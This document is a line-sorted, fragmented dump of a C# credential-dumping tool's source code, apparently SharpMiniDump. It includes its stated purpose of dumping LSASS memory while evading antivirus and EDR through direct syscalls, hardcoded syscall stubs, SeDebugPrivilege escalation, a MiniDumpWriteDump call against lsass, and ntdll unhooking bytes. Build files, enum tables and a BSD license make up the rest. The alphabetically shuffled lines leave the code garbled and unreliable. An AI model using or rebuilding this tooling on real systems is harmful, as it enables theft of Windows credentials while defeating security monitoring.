+"            SystemBootGraphicsInformation = 0x007E,"
+"            SystemBootLogoInformation = 0x008C,"
+"            SystemCallCountInformation = 0x0006,"
+"            SystemCallTimeInformation = 0x000A,"
+"            SystemCodeIntegrityInformation = 0x0067,"
+"            SystemComPlusPackage = 0x003B,"
+"            SystemCombinePhysicalMemoryInformation = 0x0082,"
+"            SystemConsoleInformation = 0x0084,"
+"            SystemContextSwitchInformation = 0x0024,"
+"            SystemCoverageInformation = 0x005F,"
+"            SystemCpuQuotaInformation = 0x0071,"
+"            SystemCrashDumpInformation = 0x0020,"
+"            SystemCrashDumpStateInformation = 0x0022,"
+"            SystemCurrentTimeZoneInformation = 0x002C,"
+"            SystemDeviceDataEnumerationInformation = 0x0089,"
+"            SystemDeviceDataInformation = 0x0088,"
+"            SystemDeviceInformation = 0x0007,"
+"            SystemDpcBehaviorInformation = 0x0018,"
+"            SystemDynamicTimeZoneInformation = 0x0066,"
+"            SystemEmulationBasicInformation = 0x003E,"
+"            SystemEmulationProcessorInformation = 0x003F,"
+"            SystemEntropyInterruptTimingInformation = 0x0083,"
+"            SystemEntropyInterruptTimingRawInformation = 0x0092,"
+"            SystemErrorPortInformation = 0x0059,"
+"            SystemErrorPortTimeouts = 0x0073,"
+"            SystemExceptionInformation = 0x0021,"
+"            SystemExtendServiceTableInformation = 0x0026,"
+"            SystemExtendedHandleInformation = 0x0040,"
+"            SystemExtendedProcessInformation = 0x0039,"
+"            SystemFileCacheInformation = 0x0015,"
+"            SystemFileCacheInformationEx = 0x0051,"
+"            SystemFirmwareTableInformation = 0x004C,"
+"            SystemFlagsInformation = 0x0009,"
+"            SystemFullMemoryInformation = 0x0019,"
+"            SystemFullProcessInformation = 0x0094,"
+"            SystemHandleInformation = 0x0010,"
+"            SystemHotpatchInformation = 0x0045,"
+"            SystemHypervisorInformation = 0x005B,"
+"            SystemHypervisorProcessorCountInformation = 0x0087,"
+"            SystemImageFileExecutionOptionsInformation = 0x005E,"
+"            SystemInterruptInformation = 0x0017,"
+"            SystemKernelDebuggerInformation = 0x0023,"
+"            SystemLegacyDriverInformation = 0x002B,"
+"            SystemLoadGdiDriverInSystemSpace = 0x0036,"
+"            SystemLoadGdiDriverInformation = 0x001A,"
+"            SystemLocksInformation = 0x000C,"
+"            SystemLogicalProcessorAndGroupInformation = 0x006B,"
+"            SystemLogicalProcessorInformation = 0x0049,"
+"            SystemLookasideInformation = 0x002D,"
+"            SystemLostDelayedWriteInformation = 0x0041,"
+"            SystemLowPriorityIoInformation = 0x0074,"
+"            SystemMemoryChannelInformation = 0x008B,"
+"            SystemMemoryListInformation = 0x0050,"
+"            SystemMemoryTopologyInformation = 0x008A,"
+"            SystemMirrorMemoryInformation = 0x001E,"
+"            SystemModuleInformation = 0x000B,"
+"            SystemModuleInformationEx = 0x004D,"
+"            SystemNativeBasicInformation = 0x0072,"
+"            SystemNodeDistanceInformation = 0x0079,"
+"            SystemNonPagedPoolInformation = 0x000F,"
+"            SystemNumaAvailableMemory = 0x003C,"
+"            SystemNumaProcessorMap = 0x0037,"
+"            SystemNumaProximityNodeInformation = 0x0065,"
+"            SystemObjectInformation = 0x0011,"
+"            SystemObjectSecurityMode = 0x0046,"
+"            SystemPageFileInformation = 0x0012,"
+"            SystemPageFileInformationEx = 0x0090,"
+"            SystemPagedPoolInformation = 0x000E,"
+"            SystemPagedPoolInformationEx = 0x0077,"
+"            SystemPathInformation = 0x0004,"
+"            SystemPerformanceInformation = 0x0002,"
+"            SystemPerformanceTraceInformation = 0x001F,"
+"            SystemPlatformBinaryInformation = 0x0085,"
+"            SystemPoolTagInformation = 0x0016,"
+"            SystemPortableWorkspaceEfiLauncherInformation = 0x0093,"
+"            SystemPrefetchPatchInformation = 0x0060,"
+"            SystemPrefetcherInformation = 0x0038,"
+"            SystemPrioritySeperation = 0x0027,"
+"            SystemProcessIdInformation = 0x0058,"
+"            SystemProcessInformation = 0x0005,"
+"            SystemProcessorBrandString = 0x0069,"
+"            SystemProcessorCycleTimeInformation = 0x006C,"
+"            SystemProcessorIdleCycleTimeInformation = 0x0053,"
+"            SystemProcessorIdleInformation = 0x002A,"
+"            SystemProcessorInformation = 0x0001,"
+"            SystemProcessorMicrocodeUpdateInformation = 0x0068,"
+"            SystemProcessorPerformanceDistribution = 0x0064,"
+"            SystemProcessorPerformanceInformation = 0x0008,"
+"            SystemProcessorPerformanceInformationEx = 0x008D,"
+"            SystemProcessorPowerInformation = 0x003D,"
+"            SystemProcessorPowerInformationEx = 0x0055,"
+"            SystemProcessorProfileControlArea = 0x0081,"
+"            SystemQueryPerformanceCounterInformation = 0x007C,"
+"            SystemRangeStartInformation = 0x0032,"
+"            SystemRecommendedSharedDataAlignment = 0x003A,"
+"            SystemRefTraceInformation = 0x0056,"
+"            SystemRegisterFirmwareTableInformationHandler = 0x004B,"
+"            SystemRegistryAppendString = 0x006E,"
+"            SystemRegistryQuotaInformation = 0x0025,"
+"            SystemScrubPhysicalMemoryInformation = 0x007F,"
+"            SystemSecureBootInformation = 0x0091,"
+"            SystemSecureBootPolicyInformation = 0x008F,"
+"            SystemSessionBigPoolInformation = 0x007D,"
+"            SystemSessionCreate = 0x002F,"
+"            SystemSessionDetach = 0x0030,"
+"            SystemSessionInformation = 0x0031,"
+"            SystemSessionMappedViewInformation = 0x0044,"
+"            SystemSessionPoolTagInformation = 0x0043,"
+"            SystemSessionProcessInformation = 0x0035,"
+"            SystemSpare0 = 0x008E,"
+"            SystemSpecialPoolInformation = 0x0057,"
+"            SystemStackTraceInformation = 0x000D,"
+"            SystemStoreInformation = 0x006D,"
+"            SystemSummaryMemoryInformation = 0x001D,"
+"            SystemSuperfetchInformation = 0x004F,"
+"            SystemSystemDiskInformation = 0x0063,"
+"            SystemSystemPartitionInformation = 0x0062,"
+"            SystemSystemPtesInformationEx = 0x0078,"
+"            SystemThreadPriorityClientIdInformation = 0x0052,"
+"            SystemThrottleNotificationInformation = 0x0086,"
+"            SystemTimeAdjustmentInformation = 0x001C,"
+"            SystemTimeOfDayInformation = 0x0003,"
+"            SystemTimeSlipNotification = 0x002E,"
+"            SystemTimeZoneInformation = 0x005D,"
+"            SystemUnloadGdiDriverInformation = 0x001B,"
+"            SystemVdmBopInformation = 0x0014,"
+"            SystemVdmInstemulInformation = 0x0013,"
+"            SystemVerifierAddDriverInformation = 0x0028,"
+"            SystemVerifierCancellationInformation = 0x0054,"
+"            SystemVerifierCountersInformation = 0x0076,"
+"            SystemVerifierFaultsInformation = 0x0061,"
+"            SystemVerifierInformation = 0x0033,"
+"            SystemVerifierInformationEx = 0x005C,"
+"            SystemVerifierRemoveDriverInformation = 0x0029,"
+"            SystemVerifierThunkExtend = 0x0034,"
+"            SystemVerifierTriageInformation = 0x004E,"
+"            SystemVhdBootInformation = 0x0070,"
+"            SystemVirtualAddressInformation = 0x006A,"
+"            SystemWatchdogTimerHandler = 0x0047,"
+"            SystemWatchdogTimerInformation = 0x0048,"
+"            SystemWow64SharedInformationObsolete = 0x004A,"
+"            Terminate = 0x00000001,"
+"            ThreadCallback,"
+"            ThreadExCallback,"
+"            ThreadIsTerminating = 0xc000004b,"
+"            ThreadNotInProcess = 0xc000012a,"
+"            ThreadWasSuspended = 0x40000001,"
+"            ThreadWriteBackingStore = 0x0008,"
+"            ThreadWriteContext = 0x0004,"
+"            ThreadWriteInstructionWindow = 0x0010,"
+"            ThreadWriteStack = 0x0002,"
+"            ThreadWriteThread = 0x0001,"
+"            ThreadWriteThreadData = 0x0020,"
+"            Timeout = 0x00000102,"
+"            TimerNotCanceled = 0xc000000c,"
+"            TmInitializationFailed = 0xc0190004,"
+"            TmVolatile = 0xc019003b,"
+"            TokenAccessInformation,"
+"            TokenAlreadyInUse = 0xc000012b,"
+"            TokenAppContainerNumber,"
+"            TokenAppContainerSid,"
+"            TokenAuditPolicy,"
+"            TokenCapabilities,"
+"            TokenDefaultDacl,"
+"            TokenDeviceClaimAttributes,"
+"            TokenDeviceGroups,"
+"            TokenElevation,"
+"            TokenElevationType,"
+"            TokenElevationTypeDefault = 1,"
+"            TokenElevationTypeFull,"
+"            TokenGroups,"
+"            TokenGroupsAndPrivileges,"
+"            TokenHasRestrictions,"
+"            TokenImpersonationLevel,"
+"            TokenIntegrityLevel,"
+"            TokenIsAppContainer,"
+"            TokenIsRestricted,"
+"            TokenLinkedToken,"
+"            TokenLogonSid,"
+"            TokenMandatoryPolicy,"
+"            TokenOrigin,"
+"            TokenOwner,"
+"            TokenPrimaryGroup,"
+"            TokenPrivileges,"
+"            TokenRestrictedDeviceClaimAttributes,"
+"            TokenRestrictedDeviceGroups,"
+"            TokenRestrictedSids,"
+"            TokenRestrictedUserClaimAttributes,"
+"            TokenSandBoxInert,"
+"            TokenSecurityAttributes,"
+"            TokenSessionId,"
+"            TokenSessionReference,"
+"            TokenSource,"
+"            TokenStatistics,"
+"            TokenType,"
+"            TokenUIAccess,"
+"            TokenUser = 1,"
+"            TokenUserClaimAttributes,"
+"            TokenVirtualizationAllowed,"
+"            TokenVirtualizationEnabled,"
+"            TooManyGuidsRequested = 0xc0000082,"
+"            TooManyLuidsRequested = 0xc0000074,"
+"            TooManyOpenedFiles = 0xc000011f,"
+"            TooManyPagingFiles = 0xc0000097,"
+"            TooManyThreads = 0xc0000129,"
+"            TransactedMappingUnsupportedRemote = 0xc0190040,"
+"            TransactionAlreadyAborted = 0xc0190015,"
+"            TransactionAlreadyCommitted = 0xc0190016,"
+"            TransactionInvalidMarshallBuffer = 0xc0190017,"
+"            TransactionNotActive = 0xc0190003,"
+"            TransactionNotJoined = 0xc0190007,"
+"            TransactionNotRequested = 0xc0190014,"
+"            TransactionPropagationFailed = 0xc0190010,"
+"            TransactionRequestNotValid = 0xc0190013,"
+"            TransactionRequiredPromotion = 0xc0190043,"
+"            TransactionScopeCallbacksNotSet = 0xc0190042,"
+"            TransactionSuperiorExists = 0xc0190012,"
+"            TransactionalConflict = 0xc0190001,"
+"            TransactionalOpenNotAllowed = 0xc019003f,"
+"            TransactionsNotFrozen = 0xc0190045,"
+"            TransactionsUnsupportedRemote = 0xc019000a,"
+"            TxfAttributeCorrupt = 0xc019003d,"
+"            TxfDirNotEmpty = 0xc0190039,"
+"            TxfMetadataAlreadyPresent = 0xc0190041,"
+"            UnableToDeleteSection = 0xc000001b,"
+"            UnableToFreeVm = 0xc000001a,"
+"            UnknownRevision = 0xc0000058,"
+"            Unsuccessful = 0xc0000001,"
+"            UserApc = 0x000000c0,"
+"            UserExists = 0xc0000063,"
+"            VFT2_DRV_COMM = 0x0000000A,"
+"            VFT2_DRV_DISPLAY = 0x00000004,"
+"            VFT2_DRV_INSTALLABLE = 0x00000008,"
+"            VFT2_DRV_KEYBOARD = 0x00000002,"
+"            VFT2_DRV_LANGUAGE = 0x00000003,"
+"            VFT2_DRV_MOUSE = 0x00000005,"
+"            VFT2_DRV_NETWORK = 0x00000006,"
+"            VFT2_DRV_PRINTER = 0x00000001,"
+"            VFT2_DRV_SOUND = 0x00000009,"
+"            VFT2_DRV_SYSTEM = 0x00000007,"
+"            VFT2_DRV_VERSIONED_PRINTER = 0x0000000C,"
+"            VFT2_FONT_RASTER = 0x00000001,"
+"            VFT2_FONT_TRUETYPE = 0x00000003,"
+"            VFT2_FONT_VECTOR = 0x00000002,"
+"            VFT_APP = 0x00000001,"
+"            VFT_DLL = 0x00000002,"
+"            VFT_DRV = 0x00000003,"
+"            VFT_FONT = 0x00000004,"
+"            VFT_STATIC_LIB = 0x00000007,"
+"            VFT_UNKNOWN = 0x00000000,"
+"            VOS_DOS = 0x00010000,"
+"            VOS_NT = 0x00040000,"
+"            VOS_OS216 = 0x00020000,"
+"            VOS_OS232 = 0x00030000,"
+"            VOS__PM16 = 0x00000002,"
+"            VOS__PM32 = 0x00000003,"
+"            VOS__WINDOWS16 = 0x00000001,"
+"            VOS__WINDOWS32 = 0x00000004,"
+"            VS_FF_DEBUG = 0x00000001,"
+"            VS_FF_INFOINFERRED = 0x00000010,"
+"            VS_FF_PATCHED = 0x00000004,"
+"            VS_FF_PRERELEASE = 0x00000002,"
+"            VS_FF_PRIVATEBUILD = 0x00000008,"
+"            VirtualMemoryOperation = 0x00000008,"
+"            VirtualMemoryRead = 0x00000010,"
+"            VirtualMemoryWrite = 0x00000020,"
+"            VirusDeleted = 0xc0000907,"
+"            VirusInfected = 0xc0000906,"
+"            VmPreReadCallback,"
+"            VmQueryCallback,"
+"            VmStartCallback,"
+"            VolumeDirty = 0xc0000806,"
+"            VolumeMounted = 0x00000109,"
+"            Wait0 = 0x00000000,"
+"            Wait1 = 0x00000001,"
+"            Wait2 = 0x00000002,"
+"            Wait3 = 0x00000003,"
+"            Wait63 = 0x0000003f,"
+"            Warning = 0x80000000,"
+"            WorkingSetLimitRange = 0x40000002,"
+"            WriteKernelMinidumpCallback,"
+"            WrongPassword = 0xc000006a,"
+"            WrongVolume = 0xc0000012,"
+"            [In, Out] ref MINIDUMP_CALLBACK_OUTPUT CallbackOutput"
+"            [In] IntPtr CallbackParam,"
+"            [In] ref MINIDUMP_CALLBACK_INPUT CallbackInput,"
+"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]"
+"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]"
+"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]"
+"            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]"
+"            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]"
+"            byte[] AssemblyBytes = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF }"
+"            if (!Natives.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))"
+"            if (!Natives.LookupPrivilegeValue(null, Privilege, ref luid))"
+"            if (!Natives.MiniDumpWriteDump(SnapshotHandle, (uint)pWinVerInfo.hTargetPID, hDmpFile, 2, ExceptionParam, UserStreamParam, pCallbackInfo))"
+"            if (!Natives.OpenProcessToken(Process.GetCurrentProcess().Handle, Natives.TOKEN_ALL_ACCESS, out currentProcessToken))"
+"            if(!pWinVerInfo.chOSMajorMinor.Equals(""10.0""))"
+"            int pss = Natives.PssCaptureSnapshot(hProcess,flags, 1048607,ref SnapshotHandle)"
+"            pWinVerInfo.hTargetPID = (IntPtr)Process.GetProcessesByName(""lsass"")[0].Id"
+"            pWinVerInfo.lpApiCall = ""NtReadVirtualMemory"""
+"            public delegate bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes)"
+"            public delegate bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength)"
+"            public delegate bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize)"
+"            public delegate bool LookupPrivilegeValue(String lpSystemName, String lpName, ref LUID luid)"
+"            public delegate bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, Microsoft.Win32.SafeHandles.SafeFileHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam)"
+"            public delegate bool MyMiniDumpWriteDumpCallback(IntPtr CallbackParam,  IntPtr CallbackInput, IntPtr CallbackOutput)"
+"            public delegate bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken)"
+"            public delegate bool RtlEqualUnicodeString(UNICODE_STRING String1, UNICODE_STRING String2, bool CaseInSensitive)"
+"            public delegate bool RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)"
+"            public delegate bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)"
+"            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)"
+"            public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint newprotect, out uint oldprotect)"
+"            public delegate int LdrLoadDll(IntPtr PathToFile,"
+"            public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)"
+"            public delegate int NtCreateFile(out Microsoft.Win32.SafeHandles.SafeFileHandle fileHandle,"
+"            public delegate int NtFilterToken(IntPtr TokenHandle, uint Flags, IntPtr SidsToDisable, IntPtr PrivilegesToDelete, IntPtr RestrictedSids, ref IntPtr hToken)"
+"            public delegate int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType)"
+"            public delegate int PssCaptureSnapshot(IntPtr ProcessHandle, PSS_CAPTURE_FLAGS CaptureFlags, int ThreadContextFlags, ref IntPtr SnapshotHandle)"
+"            public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)"
+"            public delegate int ZwProtectVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint lpNumberOfBytesWritten)"
+"            public delegate int ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength)"
+"            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)"
+"            return (uint)LdrLoadDll(PathToFile, dwFlags, ref ModuleFileName, ref ModuleHandle)"
+"            return AdjustTokenPrivileges( TokenHandle,  DisableAllPrivileges, ref  NewState,  BufferLengthInBytes, ref  PreviousState, out  ReturnLengthInBytes)"
+"            return CustomLoadLibrary.GetDllAddress(name, true)"
+"            return CustomLoadLibrary.GetExportAddress(hModule, procName)"
+"            return GetExportAddress(hModule, FunctionName)"
+"            return GetTokenInformation( TokenHandle,  TokenInformationClass,  TokenInformation,  TokenInformationLength, out  ReturnLength)"
+"            return InitializeProcThreadAttributeList(lpAttributeList, dwAttributeCount, dwFlags, ref lpSize)"
+"            return LoadLibrary(""Advapi32.dll"")"
+"            return LoadLibrary(""Kernel32.dll"")"
+"            return LoadLibrary(""Kernelbase.dll"")"
+"            return LoadLibrary(""dbgcore.dll"")"
+"            return LoadLibrary(""ntdll.dll"")"
+"            return LookupPrivilegeValue( lpSystemName,  lpName, ref  luid)"
+"            return MiniDumpWriteDump( hProcess,  ProcessId,  hFile,  DumpType,  ExceptionParam,  UserStreamParam,  CallbackParam)"
+"            return NtFilterToken(TokenHandle, Flags, SidsToDisable, PrivilegesToDelete, RestrictedSids, ref hToken)"
+"            return OpenProcessToken( hProcess,  dwDesiredAccess, out  hToken)"
+"            return PssCaptureSnapshot( ProcessHandle,  CaptureFlags,  ThreadContextFlags, ref SnapshotHandle)"
+"            return UpdateProcThreadAttribute(lpAttributeList, dwFlags, Attribute, lpValue, cbSize, lpPreviousValue, lpReturnSize)"
+"            return VirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect)"
+"            return VirtualProtectEx(hProcess, lpAddress, dwSize, newprotect, out oldprotect)"
+"            status = NativeSysCall.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, OldProtection, ref NewProtection)"
+"            status = NativeSysCall.ZwWriteVirtualMemory10(Process.GetCurrentProcess().Handle, ref proc, unmanagedPointer, (uint)AssemblyBytes.Length, ref written)"
+"            string Privilege = ""SeDebugPrivilege"""
+"            var status = NativeSysCall.ZwOpenProcess10(ref hProcess, Natives.ProcessAccessFlags.All, objAttribute, ref clientid)"
+"            var status = NativeSysCall.ZwProtectVirtualMemory10(Process.GetCurrentProcess().Handle, ref lpBaseAddress, ref uSize, 0x40, ref OldProtection)"
+"        /// 0:  49 89 ca                mov r10,rcx"
+"        /// 3:  b8 0f 00 00 00          mov eax,0x0f"
+"        /// 3:  b8 0f 00 00 00          mov eax,0x18"
+"        /// 3:  b8 0f 00 00 00          mov eax,0x1E"
+"        /// 3:  b8 0f 00 00 00          mov eax,0x36"
+"        /// 3:  b8 0f 00 00 00          mov eax,0x3A"
+"        /// 3:  b8 0f 00 00 00          mov eax,0x50"
+"        /// 3:  b8 0f 00 00 00          mov eax,0x55"
+"        /// <param name=""CanLoadFromDisk"">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>"
+"        /// <param name=""DLLName"">The name of the DLL (e.g. ""ntdll.dll"" or ""C:"
+"        /// <param name=""DLLName"">The name of the DLL (e.g. ""ntdll.dll"").</param>"
+"        /// <param name=""DLLPath"">The path to the DLL on disk. Uses the LoadLibrary convention.</param>"
+"        /// <param name=""ExportName"">The name of the export to search for (e.g. ""NtAlertResumeThread"").</param>"
+"        /// <param name=""FunctionName"">Name of the exported procedure.</param>"
+"        /// <param name=""ModuleBase"">A pointer to the base address where the module is loaded in the current process.</param>"
+"        /// Given a module base address, resolve the address of a function by manually walking the module export table."
+"        ///0:  49 89 ca                mov r10,rcx"
+"        ///3:  b8 26 00 00 00          mov eax,0x26"
+"        [StructLayout(LayoutKind.Explicit, Pack = 4)]"
+"        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]"
+"        [StructLayout(LayoutKind.Sequential, Pack = 0)]"
+"        [StructLayout(LayoutKind.Sequential, Pack = 16)]"
+"        [StructLayout(LayoutKind.Sequential, Pack = 4)]"
+"        private static bool MyMiniDumpWriteDumpCallback(IntPtr CallbackParam, ref Natives.MINIDUMP_CALLBACK_INPUT CallbackInput, ref Natives.MINIDUMP_CALLBACK_OUTPUT CallbackOutput)"
+"        public static  bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes)"
+"        public static  bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength)"
+"        public static IntPtr GetDllAddress(string DLLName, bool CanLoadFromDisk = false)"
+"        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)"
+"        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)"
+"        public static IntPtr GetProcAddress(IntPtr hModule, string procName)"
+"        public static IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId)"
+"        public static NTSTATUS NtAllocateVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)"
+"        public static NTSTATUS NtCreateFile10(out Microsoft.Win32.SafeHandles.SafeFileHandle fileHandle,"
+"        public static NTSTATUS NtFreeVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType)"
+"        public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)"
+"        public static NTSTATUS ZwProtectVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint lpNumberOfBytesWritten)"
+"        public static NTSTATUS ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength)"
+"        public static NTSTATUS ZwWriteVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)"
+"        public static UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Natives.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)"
+"        public static bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize)"
+"        public static bool LookupPrivilegeValue(String lpSystemName, String lpName, ref LUID luid)"
+"        public static bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, Microsoft.Win32.SafeHandles.SafeFileHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam)"
+"        public static bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken)"
+"        public static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)"
+"        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)"
+"        public static bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint newprotect, out uint oldprotect)"
+"        public static int NtFilterToken(IntPtr TokenHandle, uint Flags, IntPtr SidsToDisable, IntPtr PrivilegesToDelete, IntPtr RestrictedSids, ref IntPtr hToken)"
+"        public static int PssCaptureSnapshot(IntPtr ProcessHandle, PSS_CAPTURE_FLAGS CaptureFlags, int ThreadContextFlags, ref IntPtr SnapshotHandle)"
+"        public static void RtlInitUnicodeString(ref Natives.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)"
+"        static byte[] bNtAllocateVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 }"
+"        static byte[] bNtCreateFile10 = { 0x49, 0x89, 0xCA, 0xB8, 0x55, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 }"
+"        static byte[] bNtFreeVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x1E, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 }"
+"        static byte[] bZwClose10 = { 0x49, 0x89, 0xCA, 0xB8, 0x0F, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 }"
+"        static byte[] bZwOpenProcess10 = { 0x49, 0x89, 0xCA, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 }"
+"        static byte[] bZwProtectVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 }"
+"        static byte[] bZwQuerySystemInformation10 = { 0x49, 0x89, 0xCA, 0xB8, 0x36, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 }"
+"        static byte[] bZwWriteVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 }"
+"    <Compile Include=""CustomLoadLibrary.cs"" />"
+"    <Compile Include=""NativeSysCall.cs"" />"
+"    <Compile Include=""Natives.cs"" />"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"  2019"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  <PropertyGroup Condition=""'$(Configuration)"
+" "" "" "
+" "", Dll was not found."")"
+" "", export not found."")"
+" "", unable to find the specified file."")"
+" ""."" "
+" 0x01, // SS:SP, CS:IP, FLAGS, BP"
+" 0x02, // AX, BX, CX, DX, SI, DI"
+" 0x04, // DS, ES, FS, GS"
+" 0x08, // 387 state"
+" 0x10, // DB 0-3,6,7"
+" 0x20, // cpu specific extensions"
+" CONTEXT_SEGMENTS,"
+" Ignore Visual Studio temporary files, build results, and"
+" LOSS OF USE, DATA, OR PROFITS"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" except build/, which is used as an MSBuild target."
+" to a newer Visual Studio version. Backup files are not needed,"
+"// COM, impostare su true l'attributo ComVisible per tale tipo."
+"// Se il progetto viene esposto a COM, il GUID seguente verr"
+"// Se si imposta ComVisible su false, i tipi in questo assembly non saranno visibili"
+"// [assembly: AssemblyVersion(""1.0."
+"1. Redistributions of source code must retain the above copyright notice, this"
+"2. Redistributions in binary form must reproduce the above copyright notice,"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE"
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,"
+"Copyright (c) 2019, b4rtik"
+"Create a minidump of the LSASS process from memory (Windows 10 - Windows Server 2016). The entire process uses: dynamic API calls, direct syscall and Native API unhooking to evade the AV / EDR detection."
+"DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR"
